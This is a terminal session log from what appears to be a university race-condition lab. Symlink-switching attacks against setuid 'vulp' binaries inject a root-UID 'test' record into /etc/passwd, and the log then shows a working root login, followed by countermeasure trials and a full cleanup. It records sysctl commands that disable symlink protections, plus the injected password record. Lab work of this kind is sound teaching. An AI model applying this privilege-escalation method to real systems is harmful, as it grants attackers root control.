@@ -1,0 +1,581 @@
+Script started on 2026-10-03 05:44:48-04:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="80" LINES="24"]
+]0;B — Victim and resultsMember 5: B — Victim and results
+Visible desktop automation; full output and scrollback retained.
+Session: 20261003-054443
+Transcript: /home/seed/issd-member5/evidence/automation-20261003-054443/terminal-B.typescript
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+/home/seed/issd-member5/lab-files
+2026-10-03T05:44:48-04:00
+seed@VM [B:lab-files]$ [Kseed@VM [B:lab-files]$ source ../automation/preserve-failure.sh
+++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+++ date -Is
+2026-10-03T05:44:58-04:00
+++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least|su'
+++ pgrep -af '[b]ash run_trials.sh'
+++ ls -ld /tmp
+drwxrwxrwt 20 root root 4096 Oct  3 05:41 /tmp
+++ ls -l /tmp/XYZ
+-rw-rw-r-- 1 root seed 3381664 Oct  3 05:29 /tmp/XYZ
+++ stat -c 'type=%F owner=%U uid=%u group=%G mode=%a inode=%i size=%s' /tmp/XYZ
+type=regular file owner=root uid=0 group=seed mode=664 inode=4593750 size=3381664
+++ mkdir -m 700 /home/seed/issd-member5/evidence/automation-20261003-054443/pre-reset-task2b
+++ cp -p logs/task2b-20261003-052529-summary.txt logs/task2b-20261003-052529-last-output.txt /home/seed/issd-member5/evidence/automation-20261003-054443/pre-reset-task2b/
+++ stat -c '%n type=%F owner=%U uid=%u group=%G mode=%a inode=%i size=%s mtime=%y' /tmp /tmp/XYZ
+++ cp --preserve=timestamps /tmp/XYZ /home/seed/issd-member5/evidence/automation-20261003-054443/pre-reset-task2b/XYZ-content.bin
+++ sha256sum /tmp/XYZ /home/seed/issd-member5/evidence/automation-20261003-054443/pre-reset-task2b/XYZ-content.bin
+ebf805e5910024c5ca35498b116fabdba704d2020a3fa06301909f19662eacc5  /tmp/XYZ
+ebf805e5910024c5ca35498b116fabdba704d2020a3fa06301909f19662eacc5  /home/seed/issd-member5/evidence/automation-20261003-054443/pre-reset-task2b/XYZ-content.bin
+++ sha256sum logs/task2b-20261003-052529-last-output.txt logs/task2b-20261003-052529-summary.txt
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  logs/task2b-20261003-052529-last-output.txt
+db2b3aa8e861e1fd75fdae55a9689184f94dd1a5b4f4664f60be482c67a2ab33  logs/task2b-20261003-052529-summary.txt
+++ head -n 4 /home/seed/issd-member5/evidence/automation-20261003-054443/pre-reset-task2b/task2b-20261003-052529-summary.txt
+Start: 2026-10-03T05:25:32-04:00
+Victim: ./vulp
+Limit: 300 seconds
+Before: b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
+++ tail -n 5 /home/seed/issd-member5/evidence/automation-20261003-054443/pre-reset-task2b/task2b-20261003-052529-summary.txt
+Attempts=72000 elapsed=216s last_exit=0
+Attempts=73000 elapsed=219s last_exit=0
+Attempts=74000 elapsed=221s last_exit=0
+Attempts=75000 elapsed=224s last_exit=0
+Attempts=76000 elapsed=227s last_exit=0
+++ sha256sum /etc/passwd
+b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
+++ grep '^test:' /etc/passwd
+++ printf 'No test record in /etc/passwd\n'
+No test record in /etc/passwd
+++ set +x
+
+Original log preserved verbatim. No terminal completion line.
+Last recorded progress: 76000 attempts / 227s; final totals unknown.
+File-exists error was reported by the user; its original terminal is closed.
+seed@VM [B:lab-files]$ id; ls -ld /tmp; ls -l /tmp/XYZ; stat -c "type=%F owner=%U uid=%u mode=%a" /tmp/XYZ
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+drwxrwxrwt 20 root root 4096 Oct  3 05:45 /tmp
+-rw-rw-r-- 1 root seed 3381664 Oct  3 05:29 /tmp/XYZ
+type=regular file owner=root uid=0 mode=664
+seed@VM [B:lab-files]$ sudo -v
+seed@VM [B:lab-files]$ bash ../automation/prepare-trials.sh
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ date -Is
+2026-10-03T05:59:24-04:00
++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least|su'
++ pgrep -af '[b]ash run_trials.sh'
++ sudo test -f /root/issd-member5-passwd.original
++ sudo cp -a /root/issd-member5-passwd.original /etc/passwd
++ sudo cmp /etc/passwd /root/issd-member5-passwd.original
++ echo 'Clean password-file baseline restored'
+Clean password-file baseline restored
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
++ grep '^test:' /etc/passwd
++ echo 'No test record remains'
+No test record remains
++ sudo rm -f /tmp/XYZ /tmp/ABC
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ sudo sysctl -w fs.protected_symlinks=0
+fs.protected_symlinks = 0
++ sudo sysctl -w fs.protected_regular=0
+fs.protected_regular = 0
++ sudo sysctl fs.protected_symlinks fs.protected_regular
+fs.protected_symlinks = 0
+fs.protected_regular = 0
++ ls -ld /tmp
+drwxrwxrwt 20 root root 4096 Oct  3 05:59 /tmp
++ ls -l vulp vulp_slow vulp_least attack_naive attack_atomic
+-rwxr-xr-x 1 seed seed 17240 Sep 26 12:05 attack_atomic
+-rwxr-xr-x 1 seed seed 17192 Sep 26 12:05 attack_naive
+-rwsr-xr-x 1 root root 17104 Sep 26 12:05 vulp
+-rwsr-xr-x 1 root root 17240 Sep 26 12:05 vulp_least
+-rwsr-xr-x 1 root root 17368 Sep 26 12:05 vulp_slow
++ findmnt -T . -o TARGET,FSTYPE,OPTIONS
+TARGET FSTYPE OPTIONS
+/      ext4   rw,relatime,errors=remount-ro
++ cat input.txt
+test:U6aMy0wojraho:0:0:test:/root:/bin/bash
++ grep -E 'access|fopen|sleep'
++ nm -D vulp
+                 U access
+                 U fopen
++ grep -w sleep
++ nm -D vulp
++ echo 'vulp has access/fopen and no imported sleep symbol.'
+vulp has access/fopen and no imported sleep symbol.
++ grep -E 'getuid|seteuid|access|fopen'
++ nm -D vulp_least
+                 U access
+                 U fopen
+                 U getuid
+                 U seteuid
++ sha256sum vulp vulp_least attack_naive attack_atomic
+2e05af6cb49240dead55e86eb65114e4c6c7ed7a06f479b9fcbe79ae0b0073bf  vulp
+dfa202bb6032703de8b1c3aaaac6a16f027187e520c6f471d7c6dc3fa75144c2  vulp_least
+2701c7b2cc5d7faea2a96be7fc85d9fd260e6d6c40b5a8e52a296f3dcd817250  attack_naive
+0d923d4d48482cba7518f85d6662f12909d1ebcc695e473fee349359a3dd31f7  attack_atomic
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+seed@VM [B:lab-files]$ python3 ../automation/lab_runner.py monitor ./vulp 300 task2b-retry1-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Initialization confirmed: pid=176809 Naive switching active; Ctrl+C to stop.
+Seed-owned link(s) confirmed; clean baseline hash matches.
++ bash run_trials.sh ./vulp 300 task2b-retry1-20261003-054443
+Start: 2026-10-03T05:59:46-04:00
+Victim: ./vulp
+Limit: 300 seconds
+Before: b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
+Attacker exited; stopping monitor and retaining the failure.
+INTERRUPTED after 9 attempts and 0 seconds; signal_exit=143.
+After: b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
+Stop the attacker in terminal A as well.
+Monitor exited: 143 | runner wall time: 0.532873s
+Attacker confirmed stopped. attacker exited; monitor stopped after in-flight attempt
+/tmp/XYZ: regular file uid=0 mode=0o664
+Password-file SHA-256 is unchanged.
+seed@VM [B:lab-files]$ ls -ld /tmp /tmp/XYZ; stat -c "type=%F owner=%U uid=%u mode=%a" /tmp/XYZ
+drwxrwxrwt 20 root root 4096 Oct  3 05:59 /tmp
+-rw-rw-r--  1 root seed   88 Oct  3 05:59 /tmp/XYZ
+type=regular file owner=root uid=0 mode=664
+seed@VM [B:lab-files]$ bash ../automation/reset.sh
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ date -Is
+2026-10-03T06:00:46-04:00
++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least|su'
++ pgrep -af '[b]ash run_trials.sh'
++ sudo test -f /root/issd-member5-passwd.original
++ sudo cp -a /root/issd-member5-passwd.original /etc/passwd
++ sudo cmp /etc/passwd /root/issd-member5-passwd.original
++ echo 'Clean password-file baseline restored'
+Clean password-file baseline restored
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
++ grep '^test:' /etc/passwd
++ echo 'No test record remains'
+No test record remains
++ sudo rm -f /tmp/XYZ /tmp/ABC
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+seed@VM [B:lab-files]$ python3 ../automation/lab_runner.py monitor ./vulp 300 task2b-retry2-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Initialization confirmed: pid=176956 Naive switching active; Ctrl+C to stop.
+Seed-owned link(s) confirmed; clean baseline hash matches.
++ bash run_trials.sh ./vulp 300 task2b-retry2-20261003-054443
+Start: 2026-10-03T06:00:50-04:00
+Victim: ./vulp
+Limit: 300 seconds
+Before: b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
+CHANGE detected after 20 attempts and 1 seconds.
+After: ee8e5826ab8273976e0a26a3175864f21c5f539cf8d48ea382cd33951aec081b  /etc/passwd
+Exact input record found. Stop attacker; verify login and id manually.
+Monitor exited: 0 | runner wall time: 0.865370s
+Attacker confirmed stopped. monitor completed
+/tmp/XYZ: symlink uid=1000 mode=0o777
+Hash change is a signal to inspect; verify the complete record and non-sudo su login.
+seed@VM [B:lab-files]$ python3 ../automation/verify-record.py && su - test
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least'
+No attacker/victim processes remain.
++ grep -n "^test:" /etc/passwd
+51:test:U6aMy0wojraho:0:0:test:/root:/bin/bash
+Exact input record count: 1; fields: 7; UID=0; GID=0
+Home=/root; shell=/bin/bash; record length=43
++ getent passwd test
+test:U6aMy0wojraho:0:0:test:/root:/bin/bash
+SHA-256: ee8e5826ab8273976e0a26a3175864f21c5f539cf8d48ea382cd33951aec081b
+Record inspection passed. Root login still requires non-sudo su and id.
+Password: 
+]0;root@VM: ~root@VM:~# id; whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+]0;root@VM: ~root@VM:~# PS1='\u@\h [B:verified-login]$ '; unset PROMPT_COMMAND; printf '\033]0;B — Victim and results\007'; id; whoami
+]0;B — Victim and resultsuid=0(root) gid=0(root) groups=0(root)
+root
+root@VM [B:verified-login]$ exit
+logout
+seed@VM [B:lab-files]$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+seed@VM [B:lab-files]$ bash ../automation/reset.sh && sudo sysctl fs.protected_symlinks fs.protected_regular
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ date -Is
+2026-10-03T06:05:11-04:00
++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least|su'
++ pgrep -af '[b]ash run_trials.sh'
++ sudo test -f /root/issd-member5-passwd.original
++ sudo cp -a /root/issd-member5-passwd.original /etc/passwd
++ sudo cmp /etc/passwd /root/issd-member5-passwd.original
++ echo 'Clean password-file baseline restored'
+Clean password-file baseline restored
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
++ grep '^test:' /etc/passwd
++ echo 'No test record remains'
+No test record remains
++ sudo rm -f /tmp/XYZ /tmp/ABC
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+fs.protected_symlinks = 0
+fs.protected_regular = 0
+seed@VM [B:lab-files]$ python3 ../automation/lab_runner.py monitor ./vulp 300 task2c-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Initialization confirmed: pid=177327 Atomic switching active; Ctrl+C to stop.
+Seed-owned link(s) confirmed; clean baseline hash matches.
++ bash run_trials.sh ./vulp 300 task2c-20261003-054443
+Start: 2026-10-03T06:05:16-04:00
+Victim: ./vulp
+Limit: 300 seconds
+Before: b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
+CHANGE detected after 1 attempts and 0 seconds.
+After: ee8e5826ab8273976e0a26a3175864f21c5f539cf8d48ea382cd33951aec081b  /etc/passwd
+Exact input record found. Stop attacker; verify login and id manually.
+Monitor exited: 0 | runner wall time: 0.272765s
+Attacker confirmed stopped. monitor completed
+/tmp/XYZ: symlink uid=1000 mode=0o777
+/tmp/ABC: symlink uid=1000 mode=0o777
+Hash change is a signal to inspect; verify the complete record and non-sudo su login.
+seed@VM [B:lab-files]$ python3 ../automation/verify-record.py && su - test
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least'
+No attacker/victim processes remain.
++ grep -n "^test:" /etc/passwd
+51:test:U6aMy0wojraho:0:0:test:/root:/bin/bash
+Exact input record count: 1; fields: 7; UID=0; GID=0
+Home=/root; shell=/bin/bash; record length=43
++ getent passwd test
+test:U6aMy0wojraho:0:0:test:/root:/bin/bash
+SHA-256: ee8e5826ab8273976e0a26a3175864f21c5f539cf8d48ea382cd33951aec081b
+Record inspection passed. Root login still requires non-sudo su and id.
+Password: 
+]0;root@VM: ~root@VM:~# PS1='\u@\h [B:verified-login]\$ '; unset PROMPT_COMMAND; printf '\033]0;B — Victim and results\007'; id; whoami
+]0;B — Victim and resultsuid=0(root) gid=0(root) groups=0(root)
+root
+root@VM [B:verified-login]# exit
+logout
+seed@VM [B:lab-files]$ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+seed@VM [B:lab-files]$ bash ../automation/reset.sh && sudo sysctl -w fs.protected_symlinks=0 fs.protected_regular=0 && sudo sysctl fs.protected_symlinks fs.protected_regular
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ date -Is
+2026-10-03T06:07:55-04:00
++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least|su'
++ pgrep -af '[b]ash run_trials.sh'
++ sudo test -f /root/issd-member5-passwd.original
++ sudo cp -a /root/issd-member5-passwd.original /etc/passwd
++ sudo cmp /etc/passwd /root/issd-member5-passwd.original
++ echo 'Clean password-file baseline restored'
+Clean password-file baseline restored
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
++ grep '^test:' /etc/passwd
++ echo 'No test record remains'
+No test record remains
++ sudo rm -f /tmp/XYZ /tmp/ABC
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+fs.protected_symlinks = 0
+fs.protected_regular = 0
+fs.protected_symlinks = 0
+fs.protected_regular = 0
+seed@VM [B:lab-files]$ python3 ../automation/lab_runner.py monitor ./vulp_least 300 task3a-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Initialization confirmed: pid=177564 Atomic switching active; Ctrl+C to stop.
+Seed-owned link(s) confirmed; clean baseline hash matches.
++ bash run_trials.sh ./vulp_least 300 task3a-20261003-054443
+Start: 2026-10-03T06:08:01-04:00
+Victim: ./vulp_least
+Limit: 300 seconds
+Before: b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
+Attempts=1000 elapsed=31s last_exit=0
+Attempts=2000 elapsed=58s last_exit=1
+Attempts=3000 elapsed=81s last_exit=0
+Attempts=4000 elapsed=106s last_exit=1
+Attempts=5000 elapsed=130s last_exit=0
+Attempts=6000 elapsed=165s last_exit=0
+Attempts=7000 elapsed=196s last_exit=0
+Attempts=8000 elapsed=235s last_exit=1
+Attempts=9000 elapsed=280s last_exit=1
+NO CHANGE within 300s; attempts=9455. This is an observation, not proof of impossibility.
+Stop the attacker in terminal A. Last victim output:
+Open failed: Permission denied
+Monitor exited: 0 | runner wall time: 299.996265s
+Attacker confirmed stopped. monitor completed
+/tmp/XYZ: symlink uid=1000 mode=0o777
+/tmp/ABC: symlink uid=1000 mode=0o777
+Password-file SHA-256 is unchanged.
+seed@VM [B:lab-files]$ bash ../automation/task3a-controls.sh task3a-20261003-054443 2>&1 | tee logs/task3a-20261003-054443-controls.txt
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ ls -l vulp_least
+-rwsr-xr-x 1 root root 17240 Sep 26 12:05 vulp_least
++ ln -sfn /etc/passwd /tmp/XYZ
++ ls -l /tmp/XYZ
+lrwxrwxrwx 1 seed seed 11 Oct  3 06:15 /tmp/XYZ -> /etc/passwd
++ status=0
++ ./vulp_least
+No permission
++ status=1
++ printf 'Static protected-target exit=%s\n' 1
+Static protected-target exit=1
++ sha256sum /etc/passwd
+b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
++ grep '^test:' /etc/passwd
++ echo 'No test account'
+No test account
++ [[ -e ../allowed.txt ]]
++ printf 'ordinary writable file\n'
++ ln -sfn /home/seed/issd-member5/allowed.txt /tmp/XYZ
++ ./vulp_least
++ printf 'normal-operation\n'
++ cat ../allowed.txt
+ordinary writable file
+
+normal-operation+ printf '\n'
+
++ cp -p ../allowed.txt logs/task3a-20261003-054443-allowed-after.txt
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
+seed@VM [B:lab-files]$ cat ../allowed.txt; printf '\n'; sudo sysctl fs.protected_symlinks fs.protected_regular
+ordinary writable file
+
+normal-operation
+fs.protected_symlinks = 0
+fs.protected_regular = 0
+seed@VM [B:lab-files]$ bash ../automation/reset.sh && sudo sysctl -w fs.protected_symlinks=1 fs.protected_regular=0 && sudo sysctl fs.protected_symlinks fs.protected_regular && ls -ld /tmp && ls -l vulp
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ date -Is
+2026-10-03T06:16:36-04:00
++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least|su'
++ pgrep -af '[b]ash run_trials.sh'
++ sudo test -f /root/issd-member5-passwd.original
++ sudo cp -a /root/issd-member5-passwd.original /etc/passwd
++ sudo cmp /etc/passwd /root/issd-member5-passwd.original
++ echo 'Clean password-file baseline restored'
+Clean password-file baseline restored
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
++ grep '^test:' /etc/passwd
++ echo 'No test record remains'
+No test record remains
++ sudo rm -f /tmp/XYZ /tmp/ABC
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+fs.protected_symlinks = 1
+fs.protected_regular = 0
+fs.protected_symlinks = 1
+fs.protected_regular = 0
+drwxrwxrwt 20 root root 4096 Oct  3 06:16 /tmp
+-rwsr-xr-x 1 root root 17104 Sep 26 12:05 vulp
+seed@VM [B:lab-files]$ python3 ../automation/lab_runner.py monitor ./vulp 300 task3b-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Initialization confirmed: pid=196842 Atomic switching active; Ctrl+C to stop.
+Seed-owned link(s) confirmed; clean baseline hash matches.
++ bash run_trials.sh ./vulp 300 task3b-20261003-054443
+Start: 2026-10-03T06:16:42-04:00
+Victim: ./vulp
+Limit: 300 seconds
+Before: b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
+Attempts=1000 elapsed=30s last_exit=1
+Attempts=2000 elapsed=58s last_exit=1
+Attempts=3000 elapsed=90s last_exit=1
+Attempts=4000 elapsed=118s last_exit=1
+Attempts=5000 elapsed=150s last_exit=1
+Attempts=6000 elapsed=181s last_exit=1
+Attempts=7000 elapsed=210s last_exit=1
+Attempts=8000 elapsed=251s last_exit=1
+Attempts=9000 elapsed=291s last_exit=1
+NO CHANGE within 300s; attempts=9177. This is an observation, not proof of impossibility.
+Stop the attacker in terminal A. Last victim output:
+No permission
+Monitor exited: 0 | runner wall time: 299.564373s
+Attacker confirmed stopped. monitor completed
+/tmp/XYZ: symlink uid=1000 mode=0o777
+/tmp/ABC: symlink uid=1000 mode=0o777
+Password-file SHA-256 is unchanged.
+seed@VM [B:lab-files]$ bash ../automation/task3b-controls.sh 2>&1 | tee logs/task3b-20261003-054443-controls.txt
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ ls -l vulp
+-rwsr-xr-x 1 root root 17104 Sep 26 12:05 vulp
++ ln -sfn /dev/null /tmp/XYZ
++ ls -ld /tmp /tmp/XYZ
+drwxrwxrwt 20 root root 4096 Oct  3 06:24 /tmp
+lrwxrwxrwx  1 seed seed    9 Oct  3 06:24 /tmp/XYZ -> /dev/null
++ status=0
++ ./vulp
+Open failed: Permission denied
++ status=1
++ printf 'Static symlink-follow exit=%s\n' 1
+Static symlink-follow exit=1
++ sha256sum /etc/passwd
+b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
++ grep '^test:' /etc/passwd
++ echo 'No test account'
+No test account
+seed@VM [B:lab-files]$ sudo sysctl fs.protected_symlinks fs.protected_regular
+fs.protected_symlinks = 1
+fs.protected_regular = 0
+seed@VM [B:lab-files]$ bash ../automation/reset.sh && sudo sysctl -w fs.protected_symlinks=0 fs.protected_regular=0 && sudo sysctl fs.protected_symlinks fs.protected_regular
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ date -Is
+2026-10-03T06:25:09-04:00
++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least|su'
++ pgrep -af '[b]ash run_trials.sh'
++ sudo test -f /root/issd-member5-passwd.original
++ sudo cp -a /root/issd-member5-passwd.original /etc/passwd
++ sudo cmp /etc/passwd /root/issd-member5-passwd.original
++ echo 'Clean password-file baseline restored'
+Clean password-file baseline restored
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
++ grep '^test:' /etc/passwd
++ echo 'No test record remains'
+No test record remains
++ sudo rm -f /tmp/XYZ /tmp/ABC
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+fs.protected_symlinks = 0
+fs.protected_regular = 0
+fs.protected_symlinks = 0
+fs.protected_regular = 0
+seed@VM [B:lab-files]$ python3 ../automation/lab_runner.py monitor ./vulp 300 task2b-capture-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Initialization confirmed: pid=215536 Naive switching active; Ctrl+C to stop.
+Seed-owned link(s) confirmed; clean baseline hash matches.
++ bash run_trials.sh ./vulp 300 task2b-capture-20261003-054443
+Start: 2026-10-03T06:25:16-04:00
+Victim: ./vulp
+Limit: 300 seconds
+Before: b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
+Attacker exited; stopping monitor and retaining the failure.
+INTERRUPTED after 2 attempts and 0 seconds; signal_exit=143.
+After: b2386623b8c504aa933d9c519b96158bd55e5e6eb4ae75183d5abf9e5a191d67  /etc/passwd
+Stop the attacker in terminal A as well.
+Monitor exited: 143 | runner wall time: 0.378590s
+Attacker confirmed stopped. attacker exited; monitor stopped after in-flight attempt
+/tmp/XYZ: regular file uid=0 mode=0o664
+Password-file SHA-256 is unchanged.
+seed@VM [B:lab-files]$ ls -ld /tmp /tmp/XYZ; stat -c "type=%F owner=%U uid=%u mode=%a" /tmp/XYZ
+drwxrwxrwt 20 root root 4096 Oct  3 06:25 /tmp
+-rw-rw-r--  1 root seed   88 Oct  3 06:25 /tmp/XYZ
+type=regular file owner=root uid=0 mode=664
+seed@VM [B:lab-files]$ set -o pipefail; bash ../automation/cleanup.sh 2>&1 | tee logs/cleanup-20261003-054443.txt
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ date -Is
+2026-10-03T06:27:16-04:00
++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least|su'
++ pgrep -af '[b]ash run_trials.sh'
++ sudo test -f /root/issd-member5-passwd.original
++ sudo cp -a /root/issd-member5-passwd.original /etc/passwd
++ sudo cmp /etc/passwd /root/issd-member5-passwd.original
++ echo 'Clean password-file baseline restored'
+Clean password-file baseline restored
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
++ grep '^test:' /etc/passwd
++ echo 'No test record remains'
+No test record remains
++ sudo rm -f /tmp/XYZ /tmp/ABC
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ cat ../sysctl-before.txt
+fs.protected_symlinks = 0
+fs.protected_regular = 0
++ echo 'Saved file is 0/0; original pre-lab runtime values are not established.'
+Saved file is 0/0; original pre-lab runtime values are not established.
++ echo 'User-selected final policy: protected_symlinks=1, protected_regular=2.'
+User-selected final policy: protected_symlinks=1, protected_regular=2.
++ sudo sysctl -w fs.protected_symlinks=1 fs.protected_regular=2
+fs.protected_symlinks = 1
+fs.protected_regular = 2
++ sudo sysctl fs.protected_symlinks fs.protected_regular
+fs.protected_symlinks = 1
+fs.protected_regular = 2
++ sudo chmod 0755 vulp vulp_slow vulp_least
++ sudo rm -f /tmp/XYZ /tmp/ABC
++ sudo cmp /etc/passwd /root/issd-member5-passwd.original
++ echo 'Original password file restored'
+Original password file restored
++ sha256sum -c ../passwd-before.sha256
+/etc/passwd: OK
++ grep '^test:' /etc/passwd
++ echo 'No test account'
+No test account
++ ls -l vulp vulp_slow vulp_least
+-rwxr-xr-x 1 root root 17104 Sep 26 12:05 vulp
+-rwxr-xr-x 1 root root 17240 Sep 26 12:05 vulp_least
+-rwxr-xr-x 1 root root 17368 Sep 26 12:05 vulp_slow
++ pgrep -a -x 'attack_naive|attack_atomic|vulp|vulp_slow|vulp_least|su'
++ pgrep -af '[b]ash run_trials.sh'
++ echo 'No experiment or su processes remain'
+No experiment or su processes remain
++ id
